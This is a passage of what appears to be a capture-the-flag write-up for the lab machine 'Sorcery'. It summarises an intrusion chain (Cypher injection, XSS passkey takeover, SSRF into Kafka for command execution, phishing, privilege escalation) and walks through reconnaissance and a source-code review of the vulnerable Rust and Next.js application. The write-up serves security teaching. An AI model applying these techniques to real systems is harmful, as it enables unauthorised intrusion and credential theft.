![Sorcery](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/sorcery-cover.webp)

Sorcery is a Linux box with a Rust Rocket web app backed by Neo4j, Gitea, and a Kafka message bus. I’ll exploit Cypher injection in a derive-macro-generated query to leak the seller registration key, then use XSS in a product description to register a passkey on the admin account through a headless Chrome bot. I’ll also show a shortcut to change the admin’s password using cypher injection. As admin, a port-debug tool becomes an SSRF I can use to send Kafka wire protocol messages, which I’ll use to get RCE in the DNS container. From there, I’ll recover a CA keypair from FTP, phish the next user with mitmproxy proxying their own Gitea login page, read a password out of an Xvfb framebuffer, and reverse a.NET binary to generate OTPs for Docker Registry auth. Pulling layers out of a pushed image leaks another password, and the final pivots abuse FreeIPA roles to change one user’s password over LDAP and bootstrap sudo rights to root. I’ll show a couple unintended paths using pspy to capture creds as well.

### Initial Scanning

`nmap` finds two open TCP ports, SSH (22) and HTTPS (443):

```

Based on the [OpenSSH version](about:/cheatsheets/os#ubuntu), the host is likely running Ubuntu 24.04 noble LTS. The [Nginx version](about:/cheatsheets/os#ubuntu) doesn’t immediately line up with any of my recorded values.

There’s one additional hop to get to the webserver:

```
oxdf@hacky$ sudo lft 10.129.25.147:22
Tracing ...T
TTL LFT trace to 10.129.25.147:22/tcp
 1  10.10.14.1 19.2ms
 2  [target open] 10.129.25.147:22 19.6ms
oxdf@hacky$ sudo lft 10.129.25.147:443
Tracing ....T
TTL LFT trace to 10.129.25.147:443/tcp
 1  10.10.14.1 19.4ms
 2  10.129.25.147 20.0ms
 3  [target open] 10.129.25.147:443 19.9ms
```

That implies it’s running in a container.

There’s a redirect to `sorcery.htb` on port 443, as well as that same domain in the TLS certificate.

### Subdomain Brute Force

Given the use of domain name based routing, I’ll use `ffuf` to brute-force subdomains that respond differently than the default case:

```
oxdf@hacky$ ffuf -u https://10.129.25.147 -H "Host: FUZZ.sorcery.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/

        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/

```

It very quickly finds `git`. I’ll add both to my `hosts` file:

```
10.129.25.147   sorcery.htb git.sorcery.htb
```

I’ll re-run `nmap` with scripts targeting each subdomain by name, but not find anything interesting on either.

### sorcery.htb - TCP 443

#### Site

The site just presents a login form:

![image-20260414202354032](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260414202354032.webp)

The link leads to `git.sorcery.htb/nicole_sullivan/infrastructure`. In addition to logging in with password, there’s a Passkey option:

![image-20260414202431943](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260414202431943.webp)

The registration form has an optional “Registration Key” field:

![image-20260414202527339](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260414202527339.webp)

If I try to register the username admin, it fails:

![image-20260414203855869](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260414203855869.webp)

I can register an account and log in. On logging in I’m directed to `/dashboard/store`:

 ![image-20260414203417167](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260414203417167.webp)![expand](/icons/expand.png)

The items show at `/dashboard/store/<id>` and aren’t interesting, other than that someone forgot to fill in the id in the breadcrumbs:

![image-20260414203525061](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260414203525061.webp)

The IDs are GUIDs.

Under “Profile” there’s my user id, username, user type, and login type. There’s an option to enroll a passkey:

![image-20260414203609312](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260414203609312.webp)

There’s also a hint that I really want to get to be a seller (or admin).

#### Passkey

In Firefox, if I hit “Enroll Passkey”, it pops up waiting for a physical key:

![image-20260415060959382](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260415060959382.webp)

Firefox doesn’t offer a dev tools Passkey emulator, but Chrome does. I’ll open the Chrome dev tools, and click on the three dot menu at the top right. From there, “More tools”, and then “WebAuthn”:

![image-20260415060630343](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260415060630343.webp)

In the new panel, I’ll have the option to create a new authenticator:

![image-20260415060749664](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260415060749664.webp)

I’ll check each option, and hit Add. Now there’s an authenticator with no credentials:

![image-20260415060837664](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260415060837664.webp)

If I click “Enroll Passkey” on the Profile page, now the page shows an ID:

![image-20260415061128271](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260415061128271.webp)

And that same ID shows in the emulator:

![image-20260415061140713](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260415061140713.webp)

If I log out and then log in with Passkey, entering my username and submitting goes directly to the dashboard.

#### Tech Stack

The HTTP response headers show not only Nginx but also [NextJS](https://nextjs.org/):

```

The 404 page also matches the [default NextJS 404](about:/cheatsheets/404#nextjs):

![image-20260415061528470](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260415061528470.webp)

Given the availability of the source code, I’ll skip the directory brute force for now.

### git.sorcery.htb

#### Site

The site is an instance of Gitea:

![image-20260415061704198](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260415061704198.webp)

Under “Explore”, there’s one repo (the same one linked to by the main site):

![image-20260415062006030](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260415062006030.webp)

It’s got four directories and a `docker-compose.yml` file:

![image-20260415062047809](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260415062047809.webp)

I’ll go through those in detail shortly.

#### Tech Stack

The footer shows that this is Gitea version 1.22.1. The HTTP response headers also show Nginx and Gitea:

```

[Gitea](https://about.gitea.com/) is a self-hosted Git server [written in Go](https://github.com/go-gitea/gitea).

### Source Code

#### Repo

I’ll grab the link to the repo from the page and clone it. By default, this will fail for having an untrusted certificate:

```
oxdf@hacky$ git clone https://git.sorcery.htb/nicole_sullivan/infrastructure.git
Cloning into 'infrastructure'...
fatal: unable to access 'https://git.sorcery.htb/nicole_sullivan/infrastructure.git/': server certificate verification failed. CAfile: none CRLfile: none
```

`GIT_SSL_NO_VERIFY=1` will allow me to skip this:

```
oxdf@hacky$ GIT_SSL_NO_VERIFY=1 git clone https://git.sorcery.htb/nicole_sullivan/infrastructure.git
Cloning into 'infrastructure'...
remote: Enumerating objects: 169, done.
remote: Counting objects: 100% (169/169), done.

Receiving objects: 100% (169/169), 136.24 KiB | 1.87 MiB/s, done.
Resolving deltas: 100% (8/8), done.
```

Now the repo is here:

```
oxdf@hacky$ ls infrastructure/
backend  backend-macros  dns  docker-compose.yml  frontend
```

The repo only has a single commit:

```
oxdf@hacky$ git log
commit acb753dd975a639f2dbc28ee8fd4d67adc50e609 (HEAD -> main, origin/main, origin/HEAD)
Author: nicole_sullivan <nicole_sullivan@sorcery.htb>
Date:   Wed Oct 30 18:14:43 2024 +0000

    Final version
```

This does provide an email address, as well as the username format of `<first>_<last>`.

#### docker-compose.yml

The `docker-compose.yml` file defines 10 Docker containers:

```
oxdf@hacky$ cat docker-compose.yml | grep -P '^  \w'
  backend:
  frontend:
  neo4j:
  kafka:
  dns:
  mail:
  ftp:
  gitea:
  mail_bot:
  nginx:
```

#### Neo4j

`neo4j` uses the default community [Neo4j](https://neo4j.com/) image to stand up the database:

```yml
neo4j:
  restart: always
  image: neo4j:5.23.0-community-bullseye
  environment:
    NEO4J_AUTH: ${DATABASE_USER}/${DATABASE_PASSWORD}
  healthcheck:
    test: ["CMD", "bash", "-c", "cat < /dev/null > /dev/tcp/127.0.0.1/7687"]
    interval: 5s
    timeout: 10s
    retries: 5
```

It’s listening on port 7687. The healthcheck will try to read from this port every 5 seconds to make sure the DB is up.

#### Kafka

`kafka` points to an image that should be at `./kafka/Dockerfile`. [Apache Kafka](https://kafka.apache.org/) is a distributed event-streaming platform where applications publish messages to named “topics” and other applications subscribe to those topics to consume the stream. It’s commonly used as a durable message bus between microservices, for log aggregation, and for async event pipelines.

```yml
kafka:
  restart: always
  build: kafka
  environment:
    CLUSTER_ID: pXWI6g0JROm4f-1iZ_YH0Q
    KAFKA_NODE_ID: 1
    KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: CONTROLLER:PLAINTEXT,PLAINTEXT:PLAINTEXT
    KAFKA_LISTENERS: PLAINTEXT://kafka:9092,CONTROLLER://kafka:9093
    KAFKA_ADVERTISED_LISTENERS: PLAINTEXT://kafka:9092
    KAFKA_PROCESS_ROLES: broker,controller
    KAFKA_CONTROLLER_QUORUM_VOTERS: 1@kafka:9093
    KAFKA_CONTROLLER_LISTENER_NAMES: CONTROLLER
  healthcheck:
    test: ["CMD", "bash", "-c", "cat < /dev/null > /dev/tcp/kafka/9092"]
    interval: 5s
    timeout: 10s
    retries: 5
```

The `kafka` directory isn’t in the repo so I can’t see the `Dockerfile`. The environment variables indicate that this Kafka broker is running in [KRaft mode](https://developer.confluent.io/learn/kraft/), Kafka’s newer consensus protocol that replaces ZooKeeper for cluster metadata management:

- `KAFKA_PROCESS_ROLES: broker,controller` tells this single node to act as both a broker handling client traffic and a controller managing cluster metadata
- `KAFKA_CONTROLLER_QUORUM_VOTERS: 1@kafka:9093` defines a one-node Raft quorum
- The absence of any `KAFKA_ZOOKEEPER_CONNECT` variable.
- The `CLUSTER_ID` is a base64 UUID required by KRaft to format the metadata log on first boot.

Two listeners are exposed: `PLAINTEXT://kafka:9092` for clients and `CONTROLLER://kafka:9093` for the internal Raft traffic between controllers.

#### DNS

`dns` is built from the `dns` directory in the repo, and unlike the Kafka image, its source is available:

```yml
dns:
  restart: always
  build: dns
  environment:
    WAIT_HOSTS: kafka:9092
    KAFKA_BROKER: ${KAFKA_BROKER}
```

The `WAIT_HOSTS` entry means the container won’t start until `kafka:9092` is reachable, and `KAFKA_BROKER` hands it the broker address.

Inside the image, a `supervisord` config runs two processes side-by-side. [`dnsmasq`](https://thekelleys.org.uk/dnsmasq/doc.html) (a lightweight DNS/DHCP server) is configured to answer queries from `/dns/hosts` and `/dns/hosts-user`.

A small Rust binary (`/app/dns`, source in `dns/src/main.rs`) is responsible for keeping those host files in sync. The Rust process subscribes to the Kafka topic `update` and pipes every message body directly into `bash -c`:

```rust
let mut process = match Command::new("bash").arg("-c").arg(command).spawn() {
```

After each command runs, it reads `/dns/entries`, serializes the new hosts as JSON, and publishes to the Kafka topic `get`:

```rust
let entries = fetch_entries();

println!("[*] Entries: {:?}", entries);

let Ok(value) = serde_json::to_string(&entries) else {
    continue;
};

producer
    .send(&Record {
        key: (),
        value,
        topic: "get",
        partition: -1,
    })
    .ok();
```

The intended command to be sent over Kafka is `/dns/convert.sh`, a shell script in the repo that reads both `/dns/hosts` and `/dns/hosts-user`, splits each line into individual `ip hostname` pairs, and writes them into `/dns/entries`:

```bash
#!/bin/bash
entries_file=/dns/entries
hosts_files=("/dns/hosts" "/dns/hosts-user")

> $entries_file

for hosts_file in ${hosts_files[@]}; do
  while IFS= read -r line; do
    key=$(echo $line | awk '{ print $1 }')
    values=$(echo $line | cut -d ' ' -f2-)
    for value in $values; do
      echo "$key $value" >> $entries_file
    done
  done < $hosts_file
done
```

`dnsmasq` is set up to run as a service in `supervisord.conf`:

```
[program:dnsmasq]
command=/usr/sbin/dnsmasq --no-daemon --addn-hosts /dns/hosts-user --addn-hosts /dns/hosts
stdout_logfile=/proc/self/fd/1
stdout_logfile_maxbytes=0
redirect_stderr=true
user=user
```

It runs as user, and reads `/dns/hosts-user` and `/dns/hosts` on startup and uses those records.

#### MailHog

`mail` pulls a pinned image off Docker Hub:

```yml
mail:
  restart: always
  image: mailhog/mailhog:v1.0.1
```

[MailHog](https://github.com/mailhog/MailHog) is a developer SMTP server. It accepts any outbound mail the application tries to send on port 1025 and holds it in memory instead of delivering it, while exposing a web UI on port 8025 where developers can browse and inspect the captured messages. It’s commonly dropped into dev/staging environments so that features like password resets, email verification, or notifications can be exercised end-to-end without actually sending mail to real recipients.

#### VSFTPd

`ftp` uses a community [vsftpd](https://security.appspot.com/vsftpd.html) image from Docker Hub pinned to a specific commit hash:

```yml
ftp:
  restart: always
  image: million12/vsftpd:cd94636
  environment:
    ANONYMOUS_ACCESS: true
    LOG_STDOUT: true
  volumes:
    - "./ftp/pub:/var/ftp/pub"
    - "./certificates/generated/RootCA.crt:/var/ftp/pub/RootCA.crt"
    - "./certificates/generated/RootCA.key:/var/ftp/pub/RootCA.key"
  healthcheck:
    test: ["CMD", "bash", "-c", "cat < /dev/null > /dev/tcp/127.0.0.1/21"]
    interval: 5s
    timeout: 10s
    retries: 5
```

`ANONYMOUS_ACCESS: true` means the FTP server accepts logins as the `anonymous` user with no password, and `LOG_STDOUT: true` sends access logs to the container’s stdout (visible via `docker logs`). The `volumes` block is the interesting part: `./ftp/pub` from the host is mounted as the anonymous-accessible FTP root at `/var/ftp/pub`. The root certificate authority keypair is located in the `certificates` directory, which isn’t in the repo.

#### Gitea

`gitea` is built from a local Dockerfile at `gitea/Dockerfile` (the `gitea/` directory isn’t in the repo either), which presumably starts from the upstream [Gitea](https://about.gitea.com/) image and layers in some bootstrap configuration:

```yml
gitea:
  restart: always
  build:
    dockerfile: gitea/Dockerfile
    context: .
  environment:
    GITEA_USERNAME: ${GITEA_USERNAME}
    GITEA_PASSWORD: ${GITEA_PASSWORD}
    GITEA_EMAIL: ${GITEA_EMAIL}
    USER_UID: 1000
    USER_GID: 1000
    GITEA__service__DISABLE_REGISTRATION: true
    GITEA__openid__ENABLE_OPENID_SIGNIN: false
    GITEA__openid__ENABLE_OPENID_SIGNUP: false
    GITEA__security__INSTALL_LOCK: true
  healthcheck:
    test: ["CMD", "bash", "-c", "cat < /dev/null > /dev/tcp/127.0.0.1/3000"]
    interval: 5s
    timeout: 10s
    retries: 5
```

`GITEA_USERNAME`, `GITEA_PASSWORD`, and `GITEA_EMAIL` are almost certainly credentials for an admin user that the Dockerfile/entrypoint provisions on first boot via `gitea admin user create`. The `GITEA__section__KEY` variables use Gitea’s [env-var config override](https://docs.gitea.com/administration/config-cheat-sheet) convention (double underscore = section separator) and lock the instance down: `service.DISABLE_REGISTRATION=true` prevents anyone from signing up, both `openid.*` options turn off OpenID login, and `security.INSTALL_LOCK=true` prevents the web installer from being re-run (otherwise a fresh visitor could hit the install wizard and seize the instance). `USER_UID` / `USER_GID: 1000` set the filesystem ownership for repos and data. Gitea listens on port 3000 internally.

#### Mail Bot

`mail_bot` is built from a local `mail_bot/` directory that isn’t in the repo, so I’m working from the compose definition alone:

```yml
mail_bot:
  restart: always
  platform: linux/amd64
  build: mail_bot
  environment:
    WAIT_HOSTS: mail:8025
    MAILHOG_SERVER: ${MAILHOG_SERVER}
    CA_FILE: ${CA_FILE}
    EXPECTED_RECIPIENT: ${EXPECTED_RECIPIENT}
    EXPECTED_DOMAIN: ${EXPECTED_DOMAIN}
    MAIL_BOT_INTERVAL: ${MAIL_BOT_INTERVAL}
    SMTP_SERVER: ${SMTP_SERVER}
    SMTP_PORT: ${SMTP_PORT}
    PHISHING_USERNAME: ${PHISHING_USERNAME}
    PHISHING_PASSWORD: ${PHISHING_PASSWORD}
  volumes:
    - "./certificates/generated/RootCA.crt:/app/RootCA.crt"
```

The env var names telegraph exactly what this container does. `WAIT_HOSTS: mail:8025` suggests it waits on MailHog’s web UI port, meaning it talks to MailHog’s HTTP API to read the captured inbox rather than acting as an SMTP server itself. `MAIL_BOT_INTERVAL` is a periodic poll interval. On each tick it presumably walks the MailHog inbox, and for any message where the recipient matches `EXPECTED_RECIPIENT` on `EXPECTED_DOMAIN`, it follows the links in the body. `PHISHING_USERNAME` and `PHISHING_PASSWORD` are credentials the bot will submit when it lands on a login form (classic “admin opens a phishing email” automation), and `SMTP_SERVER` / `SMTP_PORT` let it reply or send follow-up mail. The `RootCA.crt` mount at `/app/RootCA.crt` combined with `CA_FILE` means the bot is configured to trust the site’s self-signed CA when following HTTPS links.

#### Nginx

`nginx` is the only container that actually exposes a port to the host:

```yml
nginx:
  restart: always
  build: nginx
  volumes:
    - "./nginx/nginx.conf:/etc/nginx/nginx.conf"
    - "./certificates/generated:/etc/nginx/certificates"
  environment:
    WAIT_HOSTS: frontend:3000, gitea:3000
  healthcheck:
    test: ["CMD", "bash", "-c", "cat < /dev/null > /dev/tcp/127.0.0.1/443"]
    interval: 5s
    timeout: 10s
    retries: 5
  ports:
    - "443:443"
```

`ports: - "443:443"` publishes container port 443 to the host’s 443, which matches the single TLS port `nmap` found from outside. The container waits on both `frontend:3000 and gitea:3000`. I don’t have access to the `nginx.conf` file, but almost certainly it handles the host-based routing to default to `sorcery.htb` and route `git` traffic to Gitea.

#### Frontend

`frontend` is built from the `frontend/` directory in the repo, which I do have:

```yml
frontend:
  restart: always
  build: frontend
  environment:
    WAIT_HOSTS: backend:8000
    API_PREFIX: ${API_PREFIX}
    HOSTNAME: 0.0.0.0
  healthcheck:
    test: ["CMD", "bash", "-c", "cat < /dev/null > /dev/tcp/127.0.0.1/3000"]
    interval: 5s
    timeout: 10s
    retries: 5
```

The directory contains a `package.json`, `next.config.mjs`, `tailwind.config.ts`, and a `src/` tree. This is a Next.js app (consistent with the `X-Powered-By: Next.js` response header seen earlier), styled with Tailwind:

```
oxdf@hacky$ ls
components.json  next.config.mjs  package-lock.json   public  tailwind.config.ts
Dockerfile       package.json     postcss.config.mjs  src     tsconfig.json
```

It waits for `backend:8000` to come up. Port 3000 is the standard Next.js production server port, reachable via the `nginx` reverse proxy at `sorcery.htb`.

#### Backend

`backend` is built from the `backend/` directory in the repo, with the build context set to the whole repo root (`context: .`) so the Dockerfile can also pull in the `backend-macros/` crate sitting next to it:

```yml
backend:
  restart: always
  platform: linux/amd64
  build:
    dockerfile: ./backend/Dockerfile
    context: .
  environment:
    WAIT_HOSTS: neo4j:7687, kafka:9092
    ROCKET_ADDRESS: 0.0.0.0
    DATABASE_HOST: ${DATABASE_HOST}
    DATABASE_USER: ${DATABASE_USER}
    DATABASE_PASSWORD: ${DATABASE_PASSWORD}
    INTERNAL_FRONTEND: http://frontend:3000
    KAFKA_BROKER: ${KAFKA_BROKER}
    SITE_ADMIN_PASSWORD: ${SITE_ADMIN_PASSWORD}
  healthcheck:
    test: ["CMD", "bash", "-c", "cat < /dev/null > /dev/tcp/127.0.0.1/8000"]
    interval: 5s
    timeout: 10s
    retries: 5
```

The backend webserver is a Rust project using the [Rocket](https://rocket.rs/) web framework app. It waits for `neo4j:7687` and `kafka:9092` before starting. The `DATABASE_*` env vars are the Neo4j connection information, `KAFKA_BROKER` is the broker address for publishing/consuming, `INTERNAL_FRONTEND: http://frontend:3000` is how the backend can reach the frontend from inside the network, and `SITE_ADMIN_PASSWORD` is presumably used to seed the built-in `admin` account I couldn’t register earlier.

This is one of the more complex codebases on a HTB machine. `main.rs` sets up the application, including:

- Running the Neo4j migrations on startup
- Caching the admin user from Neo4j
- Registering the following mounts (like routes):
	- `/api/auth/{register, login}`
		- `/api/product/{get_one, get_all, insert_product}`
				- `/api/webauthn/passkey/{start_registration, finish_registration, get, start_authentication,   finish_authentication}`
				- `/api/dns/{get_entries, update_dns}`
				- `/api/debug/port_data`
				- `/api/blog/get_blog_posts`
- Creating a Kafka consumer connected to a Kafka broker which listens for messages and uses it to update its internal DNS cache:
```rust
let broker = std::env::var("KAFKA_BROKER").expect("KAFKA_BROKER");
let topic = "get".to_string();
let group = "get".to_string();
let mut consumer = Consumer::from_hosts(vec![broker.clone()])
    .with_topic(topic)
    .with_group(group)
    .with_fallback_offset(FetchOffset::Earliest)
    .with_offset_storage(Some(GroupOffsetStorage::Kafka))
    .create()
    .unwrap_or_else(|_| panic!("Kafka consumer: {broker}"));

thread::spawn(move || loop {
    let Ok(message_sets) = consumer.poll() else {
        continue;
    };

    for message_set in message_sets.iter() {
        for message in message_set.messages() {
            let Ok(entries) = serde_json::from_slice::<Vec<DnsEntry>>(message.value) else {
                continue;
            };

            DNS.lock().unwrap().entries = entries;
        }
        consumer.consume_messageset(message_set).ok();
    }
    consumer.commit_consumed().ok();
});
```

After the Kafka consumer thread is launched, `launch()` builds the Rocket app, registers the catchers, and `manage` s the shared state (`BrowserStore`, `PasskeyStore`, `WebauthnStore` configured for `rp_id = "sorcery.htb"`, and a `KafkaStore` holding a Kafka producer). It then mounts the route tree under `/api`: `/auth/{register, login}`, `/product/{get_one, get_all, insert_product}`, `/webauthn/passkey/{start_registration, finish_registration, get, start_authentication, finish_authentication}`, `/dns/{get_entries, update_dns}`, `/debug/port_data`, and `/blog/get_blog_posts`.

There’s also a `db/initial_data.rs` module that runs through `migrate(graph)` on first boot and seeds the database with the starting state of the app:

```rust
pub async fn initial_data() {
    dotenv::dotenv().ok();
    let admin_password = std::env::var("SITE_ADMIN_PASSWORD").expect("SITE_ADMIN_PASSWORD");
    let admin = User {
        id: Uuid::new_v4().to_string(),
        username: "admin".to_string(),
        password: create_hash(&admin_password).expect("site admin hash"),
        privilege_level: UserPrivilegeLevel::Admin,
    };
    admin.save().await;

    Post {
        id: Uuid::new_v4().to_string(),
        title: "Phishing Training".to_string(),
        description:
            "Hello, just making a quick summary of the phishing training we had last week. \
        Remember not to open any link in the email unless: \
        a) the link comes from one of our domains (<something>.sorcery.htb); \
        b) the website uses HTTPS; \
        c) the subdomain uses our root CA. (the private key is safely stored on our FTP server, so it can't be hacked). "
                .to_string(),
    }
    .save()
    .await;

    Post {
        id: Uuid::new_v4().to_string(),
        title: "Phishing awareness".to_string(),
        description:
        "There has been a phishing campaign that used our Gitea instance. \
        All of our employees except one (looking at you, @tom_summers) have passed the test. \
        Unfortunately, Tom has entered their credentials, but our infosec team quickly revoked the access and changed the password. \
        Tom, make sure that doesn't happen again! Follow the rules in the other post!"
            .to_string(),
    }
    .save()
    .await;

    // ... a long list of Product { ... }.save().await calls follows
}
```

This script creates the admin user, two blog posts, and 27 products in the database.

The two blog posts give hints for a future step. The “Phishing Training” post gives instructions not to click any links unless:

- the link comes from one of our domains (`<something>.sorcery.htb`);
- the website uses HTTPS;
- the subdomain uses our root CA. (the private key is safely stored on our FTP server, so it can’t be hacked).

The “Phishing awareness” post names `tom_summers` as a user who fell for a phishing test on the Gitea instance and had their credentials reset.

#### User Model

Before digging for a foothold, it’s worth walking through how the backend models users and hands out sessions. `db/models/user.rs` defines three tiers:

```rust
#[derive(Clone, Copy, PartialOrd, PartialEq, Debug)]
pub enum UserPrivilegeLevel {
    Client = 0,
    Seller = 1,
    Admin = 2,
}
```

The interesting part is how `privilege_level` is stored on the `User`:

```rust
#[derive(Model, Debug, Deserialize)]
pub struct User {
    pub id: String,
    pub username: String,
    pub password: String,
    #[transient(fetch = "fetch_privilege_level", save = "save_privilege_level")]
    pub privilege_level: UserPrivilegeLevel,
}

impl User {
    pub fn fetch_privilege_level(id: String) -> UserPrivilegeLevel {
        *PRIVILEGES
            .lock()
            .unwrap()
            .privileges
            .get(&id)
            .unwrap_or(&UserPrivilegeLevel::Client)
    }

    pub fn save_privilege_level(&self) {
        PRIVILEGES
            .lock()
            .unwrap()
            .privileges
            .insert(self.id.clone(), self.privilege_level);
    }
}
```

The `#[transient]` attribute (defined by the `backend-macros` crate) tells the Neo4j model derive macro to not persist this field. Instead, reads and writes are routed to a global `Mutex<HashMap<String, UserPrivilegeLevel>>` called `PRIVILEGES`. Neo4j only stores `id`, `username`, and `password`, leaving the user role entirely in RAM, where it disappears on restart.

That’s why `main.rs` does this at launch:

```rust
let admin = User::get_by_username("admin".to_string()).await.unwrap();
PRIVILEGES
    .lock()
    .unwrap()
    .privileges
    .insert(admin.id, UserPrivilegeLevel::Admin);
```

`initial_data.rs` uses `SITE_ADMIN_PASSWORD` to seed an `admin` user with `UserPrivilegeLevel::Admin`, and the `save()` call hits both Neo4j (id/username/hashed password) and the `PRIVILEGES` map (role). On every subsequent boot, `main.rs` rebuilds the role entry by hand.

#### Register and Password Login

User registration takes place in `api/auth/register.rs`:

```rust
#[post("/register", data = "<data>")]
pub async fn register(data: Validated<Json<Request>>) -> Result<Json<Response>, AppError> {
    let Request { username, password, registration_key } = data.into_inner().into_inner();
    if User::get_by_username(username.to_owned()).await.is_some() {
        return Err(AppError::UsernameAlreadyExists);
    }
    let hash = create_hash(&password)?;
    let id = Uuid::new_v4().to_string();
    User {
        id: id.to_string(),
        username: username.to_owned(),
        password: hash,
        privilege_level: if registration_key.is_some()
            && &registration_key.unwrap() == REGISTRATION_KEY.get().await
        {
            UserPrivilegeLevel::Seller
        } else {
            UserPrivilegeLevel::Client
        },
    }
    .save()
    .await;
    Ok(Json(Response { id }))
}
```

Username is validated against `^[a-zA-Z0-9]+$` (`validate_username` in `api/auth.rs`), rejecting anything with special characters. The password is hashed with Argon2. The `registration_key` field (the optional input on the signup form) is compared against a `REGISTRATION_KEY` global loaded from `db/connection.rs`, and the account role is set to Client or Seller based on the match. There’s no path that hands out `Admin` through the registration endpoint.

The frontend action (`app/auth/register/actions.tsx`) is a thin Next.js server action that just POSTs `{ username, password, registrationKey }` to `auth/register`:

```ts
"use server";
export async function register(username: string, password: string, registrationKey?: string) {
  const response = await API().post("auth/register", {
    json: { username, password, registrationKey },
  });
  return convertResponse(response);
}
```

Password login in `api/auth/login.rs`:

```rust
#[post("/login", data = "<data>")]
pub async fn login<'r>(data: Validated<Json<Request<'r>>>, cookies: &CookieJar<'_>)
    -> Result<Json<Response>, AppError> {
    let Request { username, password } = data.into_inner().into_inner();
    let user = match User::get_by_username(username.to_owned()).await {
        Some(user) => user,
        None => return Err(AppError::NotFound),
    };
    if Argon2::default()
        .verify_password(password.as_bytes(), &PasswordHash::new(&user.password).unwrap())
        .is_err()
    {
        return Err(AppError::NotFound);
    }
    let claim = UserClaims {
        id: user.id,
        username: username.to_owned(),
        privilege_level: user.privilege_level,
        with_passkey: false,
        only_for_paths: None,
        exp: SystemTime::now().add(Duration::from_secs(60 * 60 * 24))
            .duration_since(UNIX_EPOCH).unwrap().as_secs() as usize,
    };
    let token = encode(&Header::default(), &claim, &EncodingKey::from_secret(JWT_SECRET.as_bytes())).unwrap();
    cookies.add(
        Cookie::build(("token", token.clone()))
            .path("/").secure(false).http_only(false),
    );
    Ok(Json(Response { token }))
}
```

The code fetches the user by username, verifies the Argon2 hash, builds a `UserClaims` object, signs it with `JWT_SECRET`, and both sets the token as a cookie and returns it in the JSON body. The cookie is created with `secure: false, http_only: false`, but in practice that cookie never reaches the user’s browser. The login is invoked via a Next.js server action (`app/auth/login/actions.tsx`) that calls the backend server-to-server, so the backend’s `Set-Cookie` lands at the Next.js server in response to its own request and is dropped.

What actually puts a cookie in the browser is the frontend code, where `User.fromJwt(token)` parses the JWT out of the JSON body, and `User.save()` (in `entity/user.ts`) calls `setCookieServer` (`entity/user-server.ts`):

```ts
export async function setCookieServer(key: string, value: string) {
  cookies().set(key, value, {
    httpOnly: true,
  });
}
```

That writes a fresh `token` cookie with `httpOnly: true`, so the browser’s copy of the JWT is not readable by client-side JavaScript. On every subsequent request, that cookie is sent to the Next.js server, and `api/client.ts` reads it via `cookies().get("token")` and forwards it as `Authorization: Bearer <jwt>` to the backend. The backend’s `RequireAuthentication` guard only reads the `Authorization` header, so the backend itself never relies on cookies at all.

The token is good for 24 hours. Failed lookups and wrong-password both return `AppError::NotFound`, so the response can’t be used to enumerate usernames.

The `UserClaims` struct itself (from `api/auth.rs`) is also interesting:

```rust
pub struct UserClaims {
    pub id: String,
    pub username: String,
    pub privilege_level: UserPrivilegeLevel,
    pub with_passkey: bool,
    pub only_for_paths: Option<Vec<String>>,
    pub exp: usize,
}
```

`privilege_level` is baked into the JWT at issue time, not re-read from `PRIVILEGES` on each request. `with_passkey` distinguishes password-only sessions from passkey sessions. `only_for_paths` takes a list of regexes, and the `RequireAuthentication` guard only honors a token if the request URI matches at least one of them:

```rust
if let Some(routes) = &claims.only_for_paths {
    if !routes.iter().any(|route| {
        Regex::new(route).unwrap().is_match(&request.uri().to_string())
    }) {
        return failure;
    }
}
```

The guards themselves live in `api/auth.rs`: `RequireAuthentication`, `RequireAdmin`, `RequireSeller`, `RequireClient`, `RequirePasskey`. Seller/Client use `<` comparisons on the `PartialOrd` derive, so `RequireSeller` admits both `Seller` (1) and `Admin` (2).

#### Passkey Login

Registering a passkey goes through `/api/webauthn/passkey/register/{start,finish}`. Both handlers take a `RequireAuthentication` guard, so the user must have an active JWT first. `start_registration.rs` handles the passkey registration process:

```rust
#[post("/register/start", format = "json", data = "<data>")]
pub async fn start_registration(
    guard: RequireAuthentication,
    data: Validated<Json<Request>>,
    passkey_store: &State<PasskeyStore>,
    webauthn_store: &State<WebauthnStore>,
) -> Result<Json<Response>, AppError> {
    let Json(Request { username }) = data.into_inner();
    let username = username.as_ref().unwrap_or(&guard.claims.username);
    let user = match User::get_by_username(username.clone()).await {
        Some(user) => user,
        None => return Err(AppError::NotFound),
    };

    match webauthn_store.instance.lock().unwrap()
        .start_passkey_registration(Uuid::from_str(&user.id).unwrap(), username, username, None)
    { ... }
}
```

The request body carries a username, and the handler uses the body’s username if provided, falling back to the guard’s username if not. It then looks up that user and binds the new passkey challenge to their ID. Specifically, it inserts the challenge state into `passkey_store.registrations` keyed by `user.id` (the target’s id):

```rust
passkey_store
    .registrations
    .lock()
    .unwrap()
    .insert(user.id.clone(), state);
```

At first glance that looks like it should let an authenticated attacker start a passkey registration for somebody else’s account. But `finish_registration.rs` doesn’t match on the body’s username. It pulls the stored state back out using the caller’s JWT id:

```rust
let Some(state) = registrations.get(&guard.claims.id) else {
    return Err(AppError::Unauthorized);
